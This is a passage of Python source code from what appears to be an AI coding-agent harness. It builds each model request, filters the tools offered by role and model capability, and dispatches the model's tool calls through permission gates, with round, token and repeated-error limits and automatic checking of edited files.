        # Reasoning models (qwen3/gpt-oss/deepseek-r1/qwq, o-series, gpt-5)
        # spend part of the budget THINKING before any visible answer; too
        # small a max_tokens yields an EMPTY reply (budget consumed mid-think).
        # Floor it so there is always room to think AND answer.
        _model_reasons = bool(
            is_reasoning
            or (_caps is not None and (_caps.is_reasoning or _caps.thinking_tagged))
        )
        if _model_reasons and max_tokens < _REASONING_MIN_TOKENS:
            max_tokens = _REASONING_MIN_TOKENS

        if system:
            # o-series uses "developer" role instead of "system"
            sys_role = "developer" if is_reasoning else "system"
            api_messages.append({"role": sys_role, "content": system})

        for msg in messages:
            api_messages.append({
                "role": msg["role"],
                "content": msg["content"],
            })

        # Check if doc/calc tools are available
        has_doc_tools = _doc_executor._ensure_loaded()
        has_calc_tools = _doc_executor._ensure_calc_loaded()
        has_coding = self._permissions is not None

        _CODING_TOOL_NAMES = {"write_file", "edit_file", "multi_edit",
                              "bash", "remember_permission",
                              "remember_permission_bundle",
                              "bash_background", "bash_status",
                              "bash_output", "bash_kill",
                              "notebook_read", "notebook_edit",
                              "task_create", "task_update", "task_list", "task_get",
                              "web_search", "web_fetch",
                              "ask_user_question",
                              "exit_plan_mode",
                              "skill",
                              "subagent",
                              "subagent_result",
                              "enter_worktree",
                              "exit_worktree",
                              "worktree_merge",
                              "schedule_wakeup",
                              "cron_create",
                              "cron_list",
                              "cron_delete",
                              "push_notification",
                              "remote_trigger",
                              "run_tests",
                              "apply_patch",
                              "find_definition",
                              "find_references",
                              "project_introspect"}
        if has_coding:
            advertised_tools = list(_DOC_TOOLS_OPENAI)
        else:
            advertised_tools = [
                t for t in _DOC_TOOLS_OPENAI
                if t.get("function", {}).get("name") not in _CODING_TOOL_NAMES
            ]

        # Strip ALL mutating tools when the active role is dashboard_agent
        # — the dashboard agent drives the UI via ACTION: slash-commands
        # and must not have bash / write / edit / apply_patch in its
        # surface, regardless of what the user prompt or coding mode says.
        # This is the code-level enforcement that backs the prompt's
        # "no code changes in dashboard mode" rule.
        _agent_role = getattr(self._permissions, "agent_role", "") or ""
        if _agent_role == "dashboard_agent":
            advertised_tools = [
                t for t in advertised_tools
                if t.get("function", {}).get("name")
                in _DASHBOARD_AGENT_ALLOWED_TOOLS
            ]

        # Strip DELFIN-only tools when the workspace is not a DELFIN repo.
        # Generic projects shouldn't see search_calcs / get_calc_info /
        # search_docs etc. — those would just return empty results and
        # pollute the agent's tool surface.
        _is_delfin = bool(getattr(self._permissions, "is_delfin_workspace",
                                   False))
        if not _is_delfin:
            advertised_tools = [
                t for t in advertised_tools
                if t.get("function", {}).get("name")
                not in _DELFIN_ONLY_TOOL_NAMES
            ]

        # Weak-model core-tool filter. Small local models (gemma-7b,
        # llama-8b, qwen-7b, phi-3.5, mistral-7b, codellama-7b) routinely
        # pick the wrong tool out of 45 options and end up calling
        # ``notebook_edit`` for a Python file or ``cron_create`` to set
        # a CONTROL key. The decision is delegated to the per-model
        # profile registry (``model_profiles.get_profile``) so each
        # model can be tuned in one central place. Strong models keep
        # the full surface; profile.core_tools_only=True trims to the
        # 15-tool _WEAK_MODEL_CORE_TOOLS set.
        try:
            from .model_profiles import get_profile as _get_profile
            _core_only = bool(_get_profile(self.model, _caps).core_tools_only)
        except Exception:
            # Fallback to the legacy heuristic if the profile registry
            # is unavailable for any reason.
            try:
                from .prompt_loader import PromptLoader
                _core_only = PromptLoader()._is_weak_model(self.model)
            except Exception:
                _core_only = False
        if _core_only:
            advertised_tools = [
                t for t in advertised_tools
                if t.get("function", {}).get("name") in _WEAK_MODEL_CORE_TOOLS
            ]

        # Vision gate: view_image only helps a model that can SEE images. Strip
        # it for text-only models so they don't open images they can't process.
        try:
            from .image_input import model_supports_vision as _msv_gate
            if not _msv_gate(self.model, _caps):
                advertised_tools = [
                    t for t in advertised_tools
                    if t.get("function", {}).get("name") != "view_image"
                ]
        except Exception:
            pass

        # Surface the available skills IN the `skill` tool description so the
        # agent knows which curated playbooks it can invoke (mirrors the MCP
        # resources/prompts listing above). Without this the model has a skill
        # tool but no idea what skills exist, so it never uses them. Build a
        # fresh dict — never mutate the shared _DOC_TOOLS_OPENAI.
        try:
            from .skills import discover_skills as _disc_skills
            _ws_sk = self._permissions.workspace if self._permissions else None
            _skills = _disc_skills(_ws_sk)
            if _skills:
                _listing = "; ".join(
                    s.name + (f" — {s.description[:70]}" if s.description else "")
                    for s in _skills[:40]
                )
                advertised_tools = [
                    ({**t, "function": {
                        **t["function"],
                        "description": (t["function"].get("description", "")
                                        + f"\nAvailable skills: {_listing}"),
                    }} if t.get("function", {}).get("name") == "skill" else t)
                    for t in advertised_tools
                ]
        except Exception:
            pass

        # No-native-tools gate (defence-in-depth behind the dashboard/CLI
        # preflight): a model with no native tool support would only choke on
        # the tool schema and leak malformed calls. Suppress tool advertising
        # so it runs cleanly in chat-only mode instead of failing silently.
        _suppress_tools = bool(_caps is not None and not _caps.supports_tools)

        # Augment with MCP tools discovered from configured servers.
        # Failures (missing config, server crash) leave the registry
        # empty — the agent simply won't see those tools.
        try:
            from . import mcp_client as _mcp
            _ws = self._permissions.workspace if self._permissions else None
            _registry = _mcp.get_registry(_ws)
            _mcp_tools = _registry.discover_all()
            # Honour the per-role execution allow-list at advertising time too:
            # a restricted role (dashboard_agent) must not even be OFFERED MCP
            # tools it may not run. The gate in _gate_mcp_tool is the execution
            # backstop; this keeps them out of the surface in the first place.
            _adv_role = getattr(self._permissions, "agent_role", "") or ""
            for _tool in _mcp_tools:
                if _tool_denied_for_role(_adv_role, _tool.namespaced_name):
                    continue
                advertised_tools.append({
                    "type": "function",
                    "function": {
                        "name": _tool.namespaced_name,
                        "description": _tool.description or _tool.name,
                        "parameters": _tool.schema or {"type": "object"},
                    },
                })
            # MCP resources + prompts surface as on-demand meta-tools so the
            # agent can read a resource / render a prompt mid-task. Advertised
            # only when connected servers actually expose them, with the
            # available items listed so the model knows what it can ask for.
            try:
                _mcp_resources = _registry.discover_resources()
            except Exception:
                _mcp_resources = []
            try:
                _mcp_prompts = _registry.discover_prompts()
            except Exception:
                _mcp_prompts = []
            if _mcp_resources and not _tool_denied_for_role(
                    _adv_role, "mcp_read_resource"):
                _res_list = "; ".join(
                    f"{r.server}:{r.uri}" + (f" ({r.name})" if r.name else "")
                    for r in _mcp_resources[:40]
                )
                advertised_tools.append({
                    "type": "function",
                    "function": {
                        "name": "mcp_read_resource",
                        "description": (
                            "Read the contents of a resource exposed by a "
                            "connected MCP server. Available resources: "
                            + _res_list
                        ),
                        "parameters": {
                            "type": "object",
                            "properties": {
                                "server": {"type": "string",
                                           "description": "MCP server name"},
                                "uri": {"type": "string",
                                        "description": "Resource URI to read"},
                            },
                            "required": ["server", "uri"],
                        },
                    },
                })
            if _mcp_prompts and not _tool_denied_for_role(
                    _adv_role, "mcp_get_prompt"):
                _prompt_list = "; ".join(
                    p.namespaced_name
                    + (f" — {p.description}" if p.description else "")
                    for p in _mcp_prompts[:40]
                )
                advertised_tools.append({
                    "type": "function",
                    "function": {
                        "name": "mcp_get_prompt",
                        "description": (
                            "Render a prompt template from a connected MCP "
                            "server and get its messages as text. Available "
                            "prompts: " + _prompt_list
                        ),
                        "parameters": {
                            "type": "object",
                            "properties": {
                                "name": {
                                    "type": "string",
                                    "description": "Namespaced prompt name "
                                                   "(mcp__server__prompt)",
                                },
                                "arguments": {
                                    "type": "object",
                                    "description": "Prompt arguments as "
                                                   "key/value pairs",
                                },
                            },
                            "required": ["name"],
                        },
                    },
                })
        except Exception:
            _mcp_tools = []

        _total_in = 0
        _total_out = 0
        _total_cached = 0      # prompt tokens served from the endpoint cache
        # Auto-verify: track .py files edited this turn so the harness can
        # check them before the model is allowed to finish.
        _edited_py: dict = {}
        _verify_attempts = 0
        _stream_attempt = 0    # transient-API-error retries (reset per response)
        _av_mode, _av_cmd = _resolve_auto_verify()
        # Per-turn tool-round budget. 15 was too tight for real coding
        # workflows: write_file + cat heredocs + venv create + pip
        # install easily eats 20+ rounds before the model can wrap up,
        # leading to silent mid-task stops. The default is now 500
        # (agent.max_tool_rounds) so genuine multi-file work finishes in a
        # single turn instead of forcing manual "continue" nudges; the
        # per-turn cost circuit-breaker and the consecutive-failure abort
        # below remain the real safety nets. 0 → uncapped. If a turn still
        # exhausts the budget, the message_delta below surfaces
        # "max_tool_rounds" and the user can resume with a "continue".
        _MAX_TOOL_ROUNDS = _resolve_max_tool_rounds()
        # Per-turn OUTPUT-token backstop, independent of _MAX_TOOL_ROUNDS: a
        # loop that keeps emitting (successful or varied-error calls that dodge
        # the round / consecutive-fail limits) could otherwise run up unbounded
        # cost within the round budget. The ceiling is very high — real work
        # never reaches it; override via DELFIN_MAX_TURN_OUTPUT_TOKENS.
        try:
            _max_turn_out = int(os.environ.get(
                "DELFIN_MAX_TURN_OUTPUT_TOKENS", "") or 0)
        except (TypeError, ValueError):
            _max_turn_out = 0
        if _max_turn_out <= 0:
            _max_turn_out = 400_000

        # Consecutive identical-error abort.
        # Some weaker models (qwen3.5 on KIT vllm) occasionally produce a
        # malformed tool_call with empty function name + empty args. The
        # dispatcher returns {"error": "Unknown tool: "} and the model,
        # not recovering from the error, re-issues the same malformed
        # call 20+ times until the round budget runs out. Track the last
        # tool_result strings; if three rounds in a row produce IDENTICAL
        # error results, abort with a clear chat message instead of
        # bleeding rounds + tokens. The check only fires when all results
        # in a round contain an `"error"` key, so legitimate repeated
        # successful calls (e.g. polling bash_status) don't trip it.
        _CONSECUTIVE_FAIL_LIMIT = 3
        _last_error_signature: str | None = None
        _consecutive_failure_count = 0
        # Thrash detector state (cleanup loops, same-file rewrites) — soft
        # nudges the model to change approach when it's spinning. Per turn.
        _thrash_state: dict = {}
        # Auto-continue: some models (o3) end the turn after each batch + a
        # "I'll continue" line. When the model stops with tasks still open AND
        # it made fresh progress this round, we inject a continue and keep the
        # SAME turn going — capped, and only after real tool activity, so it
        # can never loop without progress.
        _AUTO_CONT_CAP = 12
        _auto_cont_count = 0
        _did_tools_since_cont = False

        # Scale the tool-output elision budget to the model's real context
        # window so a big-context model keeps its earlier file reads instead
        # of re-paging them (bug 172455). Computed once — caps don't change
        # mid-turn.
        _tool_budget = _tool_context_char_budget(_caps)

        for _round in range(_MAX_TOOL_ROUNDS + 1):
            # Output backstop: stop cleanly if this turn's total generated
            # tokens crossed the (very high) per-turn ceiling. Text emitted so
            # far was already streamed to the caller, so nothing is lost.
            if _total_out > _max_turn_out:
                yield StreamEvent(type="text_delta", text=(
                    "\n⚠️ This turn generated an unusually large amount of "
                    "output and was stopped as a safety backstop. Send "
                    "'continue' to resume if this was intended.\n"))
                yield StreamEvent(
                    type="message_delta",
                    input_tokens=_total_in, output_tokens=_total_out,
                    cost_usd=self._estimate_cost(_total_in, _total_out),
                    cached_tokens=_total_cached, stop_reason="max_turn_output")
                return
            # Semantic context editing: once accumulated tool output over
            # this loop grows large, elide the OLDEST tool results (keep
            # the recent ones + all reasoning) so a long agentic turn
            # doesn't blow the input-token budget. No-op under budget.
            _elide_old_tool_results(api_messages, char_budget=_tool_budget)
            kwargs: dict[str, Any] = {
                "model": self.model,
                "messages": api_messages,
                "stream": True,
                "stream_options": {"include_usage": True},
            }

            # Ollama (and other llama.cpp-backed servers) silently truncate to
            # a tiny default num_ctx (2-4k) on the OpenAI-compatible surface
            # unless options.num_ctx is passed — so even a 128k model only
            # sees a few thousand tokens. Send the resolved (safely capped)
            # window so local models run at their real potential. Other
            # backends honour their context server-side; never send it there.
            if self._provider == "ollama" and _caps is not None \
                    and _caps.num_ctx_override:
                kwargs["extra_body"] = {
                    "options": {"num_ctx": int(_caps.num_ctx_override)}
                }

            # reasoning_effort / max_completion_tokens are OpenAI/Azure
            # reasoning-model params; Ollama rejects them (400). Keep plain
            # max_tokens for Ollama even if the model name looks reasoning-y.
            if is_reasoning and self._provider != "ollama":
                kwargs["max_completion_tokens"] = max_tokens
                if thinking_budget >= 64000:
                    kwargs["reasoning_effort"] = "high"
                elif thinking_budget >= 16000:
                    kwargs["reasoning_effort"] = "medium"
                else:
                    kwargs["reasoning_effort"] = "low"
            else:
                kwargs["max_tokens"] = max_tokens

            # Advertise tools to the model. Reasoning models (gpt-5.x, o3,
            # o4) DO support function calling — withholding tools from them
            # was the root cause of "the agent does nothing / no filesystem
            # tool was provided" on Azure GPT-5.x: the model literally had no
            # tools to call, so it could only talk (and any tool intent
            # leaked into the text channel). reasoning_effort is set
            # separately above; tools are orthogonal to it.
            if (has_doc_tools or has_calc_tools or has_coding) \
                    and not _suppress_tools:
                kwargs["tools"] = advertised_tools

            # Accumulate streamed tool calls (may arrive in chunks)
            _tool_calls: dict[int, dict] = {}  # index -> {id, name, arguments_parts}
            _text_chunks: list[str] = []

            finish_reason = None
            try:
                stream = self.client.chat.completions.create(**kwargs)
                try:
                    for chunk in stream:
                        if chunk.usage:
                            _total_in += chunk.usage.prompt_tokens or 0
                            _total_out += chunk.usage.completion_tokens or 0
                            _total_cached += _cached_tokens_of(chunk.usage)

                        if not chunk.choices:
                            continue

                        choice = chunk.choices[0]
                        delta = choice.delta

                        # Reasoning channel: some backends (Ollama for qwen3/
                        # gpt-oss, vLLM for r1) stream the model's thinking in a
                        # separate ``reasoning_content`` field, NOT in content.
                        # Surface it as thinking (visible-but-separate) instead
                        # of losing it; it never pollutes the answer text.
                        _rc = getattr(delta, "reasoning_content", None) if delta else None
                        if _rc:
                            yield StreamEvent(type="thinking_delta", text=_rc)

                        # Text content
                        if delta and delta.content:
                            _text_chunks.append(delta.content)
                            yield StreamEvent(type="text_delta", text=delta.content)

                        # Tool call chunks
                        if delta and delta.tool_calls:
                            for tc_delta in delta.tool_calls:
                                idx = tc_delta.index
                                if idx not in _tool_calls:
                                    _tool_calls[idx] = {
                                        "id": tc_delta.id or "",
                                        "name": (tc_delta.function.name or "") if tc_delta.function else "",
                                        "arguments_parts": [],
                                    }
                                entry = _tool_calls[idx]
                                if tc_delta.id:
                                    entry["id"] = tc_delta.id
                                if tc_delta.function and tc_delta.function.name:
                                    entry["name"] = tc_delta.function.name
                                if tc_delta.function and tc_delta.function.arguments:
                                    entry["arguments_parts"].append(tc_delta.function.arguments)

                        if choice.finish_reason:
                            finish_reason = choice.finish_reason
                finally:
                    stream.close()
            except Exception as _stream_exc:
                if not _is_stream_unsupported_error(_stream_exc):
                    # Not a stream-format issue. If it's a transient shared-proxy
                    # hiccup (timeout / 5xx / rate-limit) and nothing was emitted
                    # this round yet, back off and retry the round — the request
                    # state is identical, so there's no risk of duplicated
                    # output. Anything else (bad request, auth, mid-stream after
                    # partial output) re-raises as before.
                    if (_is_transient_api_error(_stream_exc)
                            and not _text_chunks and not _tool_calls
                            and _stream_attempt < _STREAM_RETRY_MAX):
                        _stream_attempt += 1
                        _delay = min(1.5 * (2 ** (_stream_attempt - 1)), 12.0)
                        yield StreamEvent(type="text_delta", text=(
                            f"\n⏳ Transient API error "
                            f"({type(_stream_exc).__name__}); retrying "
                            f"{_stream_attempt}/{_STREAM_RETRY_MAX} in "
                            f"{_delay:.0f}s…\n"))
                        time.sleep(_delay)
                        continue
                    # Context-window overflow is deterministic — retrying the
                    # same request just fails again. End the turn cleanly with a
                    # terminal stop instead of crashing the generator (which
                    # would discard every round's progress); the engine compacts
                    # before the next turn. Whatever text/tool results already
                    # streamed this turn are preserved.
                    if _is_context_length_error(_stream_exc):
                        yield StreamEvent(type="text_delta", text=(
                            "\n⚠️ The request exceeded the model's context "
                            "window. Ending this turn; the conversation will be "
                            "compacted before the next one.\n"))
                        yield StreamEvent(
                            type="message_delta", stop_reason="max_context")
                        return
                    raise
                # The proxy cannot stream this request (litellm 400:
                # "'async for' requires ... got ModelResponse"). Retry ONCE
                # without streaming and synthesize the same events from the
                # complete response — the user gets an answer instead of
                # "Agent returned no output".
                nk = dict(kwargs)
                nk["stream"] = False
                nk.pop("stream_options", None)
                resp = self.client.chat.completions.create(**nk)
                if getattr(resp, "usage", None):
                    _total_in += resp.usage.prompt_tokens or 0
                    _total_out += resp.usage.completion_tokens or 0
                    _total_cached += _cached_tokens_of(resp.usage)
                if getattr(resp, "choices", None):
                    _choice = resp.choices[0]
                    _msg = _choice.message
                    if getattr(_msg, "content", None):
                        _text_chunks.append(_msg.content)
                        yield StreamEvent(type="text_delta", text=_msg.content)
                    for _i, _tc in enumerate(
                            getattr(_msg, "tool_calls", None) or []):
                        _fn = getattr(_tc, "function", None)
                        _tool_calls[_i] = {
                            "id": getattr(_tc, "id", "") or f"ns_{_i}",
                            "name": (getattr(_fn, "name", "") or "") if _fn else "",
                            "arguments_parts": [
                                (getattr(_fn, "arguments", "") or "") if _fn else ""
                            ],
                        }
                    finish_reason = _choice.finish_reason

            # Got a response (streamed or fallback): clear the transient-retry
            # budget so a later hiccup in this same (possibly long) turn gets a
            # fresh set of retries rather than inheriting an exhausted count.
            _stream_attempt = 0

            # Harmony tool-channel recovery: gpt-5.x via the OpenAI-compatible
            # endpoint sometimes leaks its tool calls ("to=<tool> {json}") into
            # the TEXT stream instead of emitting structured tool_calls. If we
            # see that and no real tool_calls arrived, synthesise them so the
            # intended tools actually run — through the SAME permission-gated
            # dispatch below — and replace the visible text with the cleaned
            # version. Only acts on cleanly-parsed JSON args (never executes
            # garbage), so safety is unchanged.
            if not (finish_reason == "tool_calls" and _tool_calls):
                _joined = "".join(_text_chunks)
                try:
                    from delfin.agent.text_sanitize import (
                        parse_leaked_tool_calls, sanitize_agent_text,
                    )
                    _recovered = [
                        c for c in parse_leaked_tool_calls(_joined)
                        if isinstance(c.get("arguments"), dict) and c["arguments"]
                    ]
                except Exception:
                    _recovered = []
                if _recovered:
                    for _i, _c in enumerate(_recovered):
                        _tool_calls[_i] = {
                            "id": f"leak_{_i}",
                            "name": _c["name"],
                            "arguments_parts": [json.dumps(_c["arguments"])],
                        }
                    try:
                        _text_chunks = [sanitize_agent_text(_joined).text]
                    except Exception:
                        _text_chunks = []
                    finish_reason = "tool_calls"
                    # Visible note so the user sees WHY the agent suddenly acts:
                    # its leaked tool calls were repaired and are now running.
                    _names = ", ".join(c["name"] for c in _recovered)
                    yield StreamEvent(
                        type="text_delta",
                        text=(f"\n\n🔧 [repaired the model's tool-call format — "
                              f"executing {len(_recovered)} tool call(s) "
                              f"({_names}) now]\n"),
                    )

            # If model made tool calls, execute them locally and loop
            if finish_reason == "tool_calls" and _tool_calls:
                # Build assistant message with tool_calls for the API
                assistant_msg: dict[str, Any] = {"role": "assistant"}
                if _text_chunks:
                    assistant_msg["content"] = "".join(_text_chunks)
                else:
                    assistant_msg["content"] = None
                tc_list = []
                for idx in sorted(_tool_calls):
                    entry = _tool_calls[idx]
                    tc_list.append({
                        # Backfill a unique id when the backend streamed none
                        # (some vLLM/Ollama builds omit tool_call ids): an empty
                        # or duplicated tool_call_id makes the NEXT request's
                        # assistant/tool pairing ambiguous and can 400.
                        "id": entry["id"] or f"call_{idx}",
                        "type": "function",
                        "function": {
                            "name": entry["name"],
                            "arguments": "".join(entry["arguments_parts"]),
                        },
                    })
                assistant_msg["tool_calls"] = tc_list
                api_messages.append(assistant_msg)

                # Parallel subagent fan-out: when the
                # model emits ≥2 `subagent` calls in ONE turn, run them
                # concurrently instead of sequentially.  The sequential
                # loop below resolves each future in tc_list order, so
                # event-yield and api_message ordering are unchanged.
                _sub_futures, _sub_executor = _fan_out_subagents(
                    tc_list, self._permissions
                )

                # Track results from this round for consecutive-failure
                # detection. Each entry is the tool_result string.
                _round_results: list[str] = []

                # Execute each tool call and append results
                for tc in tc_list:
                    fn_name = (tc["function"]["name"] or "").strip()
                    # Parse arguments defensively: a backend may stream a dict
                    # already, invalid JSON, or valid JSON that is NOT an object
                    # (e.g. "true", "[1,2]", "42"). Every downstream handler does
                    # arguments.get(...), so anything but a dict must become {}
                    # here or it raises AttributeError and crashes the whole turn.
                    _raw_args = tc["function"]["arguments"]
                    if isinstance(_raw_args, dict):
                        fn_args = _raw_args
                    else:
                        try:
                            fn_args = json.loads(_raw_args or "{}")
                        except (json.JSONDecodeError, TypeError, ValueError):
                            fn_args = {}
                    if not isinstance(fn_args, dict):
                        fn_args = {}

                    # Empty-name guard: malformed tool-call from the model
                    # (most common with qwen3.5 on KIT vllm). Return a
                    # specific, actionable error so the model has a
                    # chance to recover — and so the loop's consecutive-
                    # failure detector can spot the pattern.
                    if not fn_name:
                        result = json.dumps({"error": (
                            "malformed tool_call: function name is empty. "
                            "Your previous output likely produced an empty "
                            "or unparseable tool call. Either retry with a "
                            "valid named tool, or tell the user something "
                            "is wrong with the model output and stop calling "
                            "tools this turn."
                        )})
                        yield StreamEvent(
                            type="tool_result",
                            tool_name="<malformed>",
                            tool_output=result[:2000],
                        )
                        api_messages.append({
                            "role": "tool",
                            "tool_call_id": tc["id"],
                            "content": result,
                        })
                        _round_results.append(result)
                        continue

                    # Coding-agent tools get a different namespace prefix so
                    # the UI/Whitelist layer can distinguish them from doc tools.
                    is_coding = fn_name in ("write_file", "edit_file",
                                            "multi_edit", "bash",
                                            "remember_permission",
                                            "remember_permission_bundle",
                                            "bash_background",
                                            "bash_status",
                                            "bash_output",
                                            "bash_kill",
                                            "notebook_read",
                                            "notebook_edit",
                                            "task_create",
                                            "task_update",
                                            "task_list",
                                            "web_search",
                                            "web_fetch",
                                            "ask_user_question",
                                            "exit_plan_mode",
                                            "skill",
                                            "subagent",
                                            "subagent_result",
                                            "enter_worktree",
                                            "exit_worktree",
                                            "worktree_merge",
                                            "schedule_wakeup",
                                            "cron_create",
                                            "cron_list",
                                            "cron_delete",
                                            "push_notification",
                                            "remote_trigger",
                                            "run_tests",
                                            "apply_patch",
                                            "find_definition",
                                            "find_references",
                                            "project_introspect")
                    ns_prefix = "kit-coding" if is_coding else "delfin-docs"

                    # MCP tools come prefixed mcp__server__name and route
                    # through the registry, bypassing the doc executor.
                    is_mcp = fn_name.startswith("mcp__")
                    # MCP resource/prompt meta-tools (single underscore).
                    is_mcp_meta = fn_name in (
                        "mcp_read_resource", "mcp_get_prompt")

                    # Emit tool_use event for UI display
                    yield StreamEvent(
                        type="tool_use",
                        tool_name=fn_name if (is_mcp or is_mcp_meta)
                                  else f"mcp__{ns_prefix}__{fn_name}",
                        tool_input=json.dumps(fn_args),
                    )

                    if tc["id"] in _sub_futures:
                        # Pre-dispatched parallel subagent — collect result.
                        # Bounded wait: a stalled child (its per-event wall guard
                        # can't fire without events) must not freeze the parent
                        # turn. On timeout the daemon thread keeps running but
                        # the parent moves on with an error result.
                        try:
                            result = _sub_futures[tc["id"]].result(
                                timeout=_subagent_collect_timeout())
                        except Exception as exc:
                            _msg = str(exc) or type(exc).__name__
                            result = json.dumps({
                                "error": f"subagent did not finish in time "
                                         f"or failed: {_msg}"
                            })
                    elif is_mcp:
                        # Shell-executing MCP tools (mcp__kit-coding__bash …)
                        # run REMOTELY and would bypass the native bash gate;
                        # apply the same content-gate (deny-list, secret/egress
                        # scan, confirm/head-less block) before forwarding.
                        _mcp_block = _doc_executor._gate_mcp_tool(
                            fn_name, fn_args, self._permissions)
                        if _mcp_block is not None:
                            result = json.dumps({"error": _mcp_block})
                        else:
                            try:
                                from . import mcp_client as _mcp
                                _ws = (self._permissions.workspace
                                       if self._permissions else None)
                                result = _mcp.get_registry(_ws).call(
                                    fn_name, fn_args)
                            except Exception as exc:
                                result = json.dumps({
                                    "error": f"MCP dispatch failed: {exc}"
                                })
                    elif is_mcp_meta:
                        # MCP resource/prompt meta-tools also skip execute()'s
                        # role check — apply the same deny-by-default so a
                        # restricted role can't read MCP resources it isn't
                        # allowed to.
                        _meta_role = getattr(self._permissions, "agent_role",
                                             "") or ""
                        if (self._permissions is not None
                                and _tool_denied_for_role(_meta_role, fn_name)):
                            result = json.dumps({"error": (
                                f"Tool '{fn_name}' is not available to the "
                                f"'{_meta_role}' role."
                            )})
                        else:
                            try:
                                from . import mcp_client as _mcp
                                _ws = (self._permissions.workspace
                                       if self._permissions else None)
                                _reg = _mcp.get_registry(_ws)
                                if fn_name == "mcp_read_resource":
                                    result = _reg.read_resource(
                                        str(fn_args.get("server", "")),
                                        str(fn_args.get("uri", "")))
                                else:
                                    result = _reg.get_prompt(
                                        str(fn_args.get("name", "")),
                                        fn_args.get("arguments") or {})
                            except Exception as exc:
                                result = json.dumps({
                                    "error": f"MCP {fn_name} failed: {exc}"
                                })
                    else:
                        # Wrap like the MCP/subagent paths above: an uncaught
                        # exception in any tool handler would otherwise escape
                        # the generator and kill the ENTIRE turn, discarding
                        # every round's ephemeral progress. A per-tool failure
                        # must degrade to a recoverable error the model can see.
                        try:
                            result = _doc_executor.execute(
                                fn_name, fn_args, permissions=self._permissions
                            )
                        except Exception as exc:
                            result = json.dumps({
                                "error": f"tool '{fn_name}' failed: {exc}"
                            })

                    # Emit tool_result event for UI display
                    yield StreamEvent(
                        type="tool_result",
                        tool_name=fn_name if (is_mcp or is_mcp_meta)
                                  else f"mcp__{ns_prefix}__{fn_name}",
                        tool_output=result[:2000],
                    )

                    # Truncate the *context-bound* copy so a 200 kB MCP
                    # result doesn't blow the next request's input-token
                    # budget. The UI already got the truncated 2000-char
                    # preview above; the model now gets head+tail with a
                    # marker so tracebacks survive. JSON-error blobs and
                    # short results pass through untouched.
                    context_result = _smart_truncate(
                        result, cap=5000, label="tool_result"
                    )
                    # Thrash detector: prepend a one-time progress nudge when a
                    # low-progress loop (repeated cleanup, same-file rewrites) is
                    # detected, so the model changes approach instead of spinning.
                    _thrash_note = _thrash_check(_thrash_state, fn_name, fn_args)
                    if _thrash_note:
                        context_result = _thrash_note + "\n\n" + context_result
                    api_messages.append({
                        "role": "tool",
                        "tool_call_id": tc["id"],
                        "content": context_result,
                    })
                    _round_results.append(result)

                    # Track .py files successfully edited this turn (for the
                    # turn-end auto-verify). A new edit invalidates a prior pass.
                    if (_av_mode != "off"
                            and fn_name in ("edit_file", "multi_edit", "write_file")
                            and not str(result).lstrip().startswith('{"error"')):
                        _ep = (fn_args.get("path")
                               if isinstance(fn_args, dict) else None)
                        if _ep and str(_ep).endswith(".py"):
                            try:
                                # "." default matches the verify gate's
                                # workspace default, so edit-tracking and
                                # verification resolve paths the same way.
                                _ws = str(getattr(self._permissions, "workspace", ".") or ".")
                                _abs = (str(_ep) if os.path.isabs(str(_ep))
                                        else os.path.join(_ws, str(_ep)))
                                _edited_py[_abs] = True
                            except Exception:
                                pass

                # All futures resolved in the loop above — release threads.
                if _sub_executor is not None:
                    _sub_executor.shutdown(wait=False)

                # view_image: a tool result is text-only, so the handler stashed
                # any image the agent opened. Inject it now as visual content
                # for the NEXT round so a vision-capable model actually SEES it.
                _pending_imgs = getattr(_doc_executor, "_pending_view_images", None)
                if _pending_imgs:
                    _doc_executor._pending_view_images = []
                    try:
                        from .image_input import model_supports_vision as _msv
                        if _msv(self.model, _caps):
                            for _img in _pending_imgs:
                                _nm = (_img.source_path.name
                                       if _img.source_path else "image")
                                api_messages.append({
                                    "role": "user",
                                    "content": [
                                        {"type": "text",
                                         "text": f"[Image you opened: {_nm}]"},
                                        {"type": "image_url",
                                         "image_url": {"url": _img.data_uri()}},
                                    ],
                                })
                    except Exception:
                        pass

                # This round executed tools → real progress was made (used to
                # gate auto-continue so it never fires without progress).
                _did_tools_since_cont = True

                # Mid-loop steering: if the user sent a message WHILE the loop
                # was running, inject it now as a user turn so the model reacts
                # to it on the very next round (no waiting for the turn to end).
                for _steer in self._drain_steer():
                    api_messages.append({"role": "user", "content": _steer})
                    yield StreamEvent(
                        type="text_delta", text="\n\n💬 [you, mid-run]: " + _steer + "\n")

                # Consecutive-failure check. A "failure round" is one
                # where every tool_result this round is an `{"error": …}`
                # JSON and the joined signature matches the previous
                # round. After N identical-error rounds, abort the loop
                # with a visible chat notice. Saves $0.02-0.05 per
                # malformed session compared to bleeding to the round cap.
                def _is_error_result(s: str) -> bool:
                    return s.lstrip().startswith('{"error"')
                if _round_results and all(_is_error_result(r) for r in _round_results):
                    signature = "|".join(_round_results)
                    if signature == _last_error_signature:
                        _consecutive_failure_count += 1
                    else:
                        _consecutive_failure_count = 1
                        _last_error_signature = signature
                    if _consecutive_failure_count >= _CONSECUTIVE_FAIL_LIMIT:
                        yield StreamEvent(
                            type="text_delta",
                            text=(
                                f"\n\n⚠ Aborting tool loop: {_consecutive_failure_count}"
                                f" rounds in a row produced identical errors. "
                                f"Last error: {_round_results[0][:200]}\n"
                                f"This usually means the model is generating "
                                f"malformed tool calls. Try: switch model "
                                f"(dropdown → azure.gpt-5), restart session, or "
                                f"reword the prompt.\n"
                            ),
                        )
                        cost = self._estimate_cost(_total_in, _total_out)
                        yield StreamEvent(
                            type="message_delta",
                            input_tokens=_total_in,
                            output_tokens=_total_out,
                            cost_usd=cost,
                            cached_tokens=_total_cached,
                            stop_reason="consecutive_identical_errors",
                        )
                        return
                else:
                    # Reset on any non-failure round so the counter
                    # only catches true error-loops, not transient
                    # errors mixed with success.
                    _last_error_signature = None
                    _consecutive_failure_count = 0

                # Loop back to get the model's next response
                continue

            # No tool calls — the model thinks it's done. Auto-verify the code
            # it edited BEFORE letting the turn finish: if it left a problem,
            # inject it and force a fix round (the model can't just claim done).
            # Re-checked at every turn-end (a passing check breaks out, so we
            # only ever re-reach here after a failure) — so a model that just
            # ACKNOWLEDGES without actually editing is still re-verified, not let
            # off. Bounded so a genuinely unfixable failure can't loop forever.
            if (_edited_py and _av_mode != "off" and _verify_attempts < 2):
                _verify_attempts += 1
                _problems = _run_auto_verify(
                    list(_edited_py), _av_mode, _av_cmd,
                    getattr(self._permissions, "workspace", "."))
                if _problems:
                    _record_security_event(
                        "auto_verify", "verify", _problems[:80], blocked=False)
                    yield StreamEvent(
                        type="text_delta",
                        text=("\n\n🔁 Auto-verify: the code just edited has a "
